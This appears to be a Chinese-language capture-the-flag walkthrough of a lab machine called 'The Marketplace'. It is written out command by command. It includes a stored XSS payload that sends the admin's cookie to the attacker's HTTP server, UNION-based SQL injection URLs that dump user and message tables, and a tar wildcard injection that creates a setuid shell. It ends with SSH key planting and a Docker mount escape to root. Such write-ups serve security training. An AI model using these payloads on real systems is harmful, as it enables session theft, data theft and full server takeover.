# The Marketplace

The Marketplace的系统管理员Michael已经允许你访问他的内部服务器，所以你可以对他和他的团队一直在研究的市场平台进行渗透测试。他说，他和他的团队仍然需要解决一些错误。

你能利用这一点吗，你能在他的服务器上获得root访问权限吗？

---

## 端口扫描

循例 nmap 扫：

    ┌──(root🐦kali)-[/home/sugobet]
    └─# nmap -sS 10.10.215.254 
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-15 11:28 CST
    Nmap scan report for 10.10.215.254
    Host is up (0.27s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT      STATE SERVICE
    22/tcp    open  ssh
    80/tcp    open  http
    32768/tcp open  filenet-tms

## web检索

主页有两篇文章：

    http://10.10.215.254/item/1

尝试尝试注入，失败

有登录页面和注册页面，也尝试注入，失败

## 存储型XSS

在两篇文章中发现：

     Contact the listing author 联系列表作者 | Report listing to admins 向管理员报告列表 

Report listing to admins 可以举报某个页面，并且管理员会检索页面内容

我们举报已经存在的页面之后，不久我们收到一条来自管理员的消息：

    Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! 谢谢你的报告。我们的管理员将评估您所举报的物品是否违反了我们的准则，并会通过私人消息与您联系。感谢您使用市场! 

    From system 来自系统
    Thank you for your report. We have reviewed the listing and found nothing that violates our rules. 谢谢你的报告。我们已经检查了列表，没有发现任何违反我们规则的内容。
    From system 来自系统

我们还发现了，我们可以新建页面，这就意味着，如果存在xss注入，并向管理员举报

一旦管理员检查该页面，我们注入的恶意js代码将被执行

我们新建页面：

    http://10.10.215.254/new

在title和desc写入以下js代码：

    <script>fetch('http://10.14.39.48:8000/?cookie=' + btoa(document.cookie));</script>

然后添加，打开页面查看源代码，我们发现js代码已经被正常解析

使用python开启http服务：

    python3 -m http.server

然后在点击向管理员举报该页面

我们将收到管理员的cookie：

    10.10.215.254 - - [15/Jan/2023 11:51:19] "GET /?cookie=dG9rZW49ZXlK***************w5NHBEYkpJ HTTP/1.1" 200 -

将其base64解码后，使用火狐浏览器的插件 Cookie-Editor将cookie添加进去

我们使用该cookie成功登录进michael的账号

## SQL injection

进入管理页面，列出了几个用户，点击查看这些用户信息，发现url存在sqli

    http://10.10.215.254/admin?user=1 and sleEp(3);

    http://10.10.215.254/admin?user=-1 union select database(),2,3,4

    http://10.10.215.254/admin?user=-1 union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema='marketplace'

    http://10.10.215.254/admin?user=-1 union select group_concat(column_name),2,3,4 from information_schema.columns where table_name='users'

    http://10.10.215.254/admin?user=-1 union select group_concat(username,password),2,3,4 from users

常规操作

## 密码爆破

我们得到了几个账号的密码hash

分析题目开头那句话，我们锁定michael，爆破它的密码hash

hashcat:

    ┌──(root🐦kali)-[/home/sugobet]
    └─# hashcat -a 0 -m 3200 '$2b$10$yaYKN53***********vu2EXwQDGf/1q' /usr/share/wordlists/rockyou.txt

真倒霉，又没爆出来

## mysql枚举

但是我在数据库另一个表中发现了明文密码：

    http://10.10.215.254/admin?user=-1 union select group_concat(id,user_from,' || ',user_to,' || ',message_content,' || ',is_read,' || '),2,3,4 from messages

:

    11 || 3 || Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: @b_EN*******Av3zJ

回到users表查看id：

    http://10.10.215.254/admin?user=-1 union select group_concat(id,'||',username, '||'),2,3,4 from users

说明这是jake的密码

ssh直接登录：

    jake@the-marketplace:~$ id
    uid=1000(jake) gid=1000(jake) groups=1000(jake)
    jake@the-marketplace:~$ cat ./user.txt

sudo -l发现：

    User jake may run the following commands on the-marketplace:
        (michael) NOPASSWD: /opt/backups/backup.sh

## tar通配符注入 - 横向移动

    jake@the-marketplace:~$ ls -la /opt/backups/backup.sh
    -rwxr-xr-x 1 michael michael 73 Aug 23  2020 /opt/backups/backup.sh
    jake@the-marketplace:~$ cat /opt/backups/backup.sh
    #!/bin/bash
    echo "Backing up files...";
    tar cf /opt/backups/backup.tar *

又是tar，不解释，直接操作:

    jake@the-marketplace:~$ echo "" > "--checkpoint=1"
    jake@the-marketplace:~$ echo "" > "--checkpoint-action=exec=sh hack.sh"
    jake@the-marketplace:~$ echo "cp /bin/bash /tmp/bash;chmod +s /tmp/bash" > ./hack.sh

sudo执行该脚本：

    jake@the-marketplace:~$ sudo -u michael /opt/backups/backup.sh
    Backing up files...
    tar: /opt/backups/backup.tar: Cannot open: Permission denied
    tar: Error is not recoverable: exiting now
    jake@the-marketplace:~$ ls -la /opt/backups/backup.tar
    -rw-rw-r-- 1 jake jake 10240 Jan 15 05:14 /opt/backups/backup.tar

执行该脚本发现backup.tar无权访问，但是jake是所有者，我们可以修改权限

    chmod 777 /opt/backups/backup.tar

再次执行，报错user.txt也无权，使用同样的方法修改权限再次运行即可：

    chmod 777 ./user.txt 

    jake@the-marketplace:~$ sudo -u michael /opt/backups/backup.sh
    Backing up files...

使用/tmp/bash -p：

    jake@the-marketplace:~$ /tmp/bash -p
    bash-4.4$ id
    uid=1000(jake) gid=1000(jake) euid=1002(michael) egid=1002(michael) groups=1002(michael),1000(jake)

## 篡改ssh authorized_keys

攻击机生成ssh密钥

    ssh-keygen

将公钥复制到目标/home/miachel/.ssh/authorized_keys

    mkdir ./.ssh
    touch ./.ssh/authorized_keys
    vim ./.ssh/authorized_keys

然后攻击机ssh登录：

    ┌──(root🐦kali)-[/home/sugobet]
    └─# ssh michael@10.10.215.254 -i id_rsa  

成功

## Docker

还记得刚刚端口扫描的结果，有一个32768端口是开启的

能猜到可能是docker，id更验证了我的想法：

    michael@the-marketplace:~$ id
    uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)

查看image:

    michael@the-marketplace:~$ docker image ls
    REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
    themarketplace_marketplace   latest              6e3d8ac63c27        2 years ago         2.16GB
    nginx                        latest              4bb46517cac3        2 years ago         133MB
    node                         lts-buster          9c4cc2688584        2 years ago         886MB
    mysql                        latest              0d64f46acfd1        2 years ago         544MB
    alpine                       latest              a24bb4013296        2 years ago         5.57MB

查看正在运行的镜像：

    michael@the-marketplace:~$ docker ps
    CONTAINER ID        IMAGE                        COMMAND                  CREATED             STATUS              PORTS                     NAMES
    49ecb0cfeba8        nginx                        "/docker-entrypoint.…"   2 years ago         Up 2 hours          0.0.0.0:80->80/tcp        themarketplace_nginx_1
    3c6f21da8043        themarketplace_marketplace   "bash ./start.sh"        2 years ago         Up 2 hours          0.0.0.0:32768->3000/tcp   themarketplace_marketplace_1
    59c54f4d0f0c        mysql                        "docker-entrypoint.s…"   2 years ago         Up 2 hours          3306/tcp, 33060/tcp       themarketplace_db_1

运行alpine镜像并将宿根挂载到容器的/tmp：

    docker run -v /:/tmp -it alpine:latest sh   

root.txt:

    / # find / -name root.txt 2>/dev/null
    /tmp/root/root.txt
    / # cat /tmp/root/root.txt
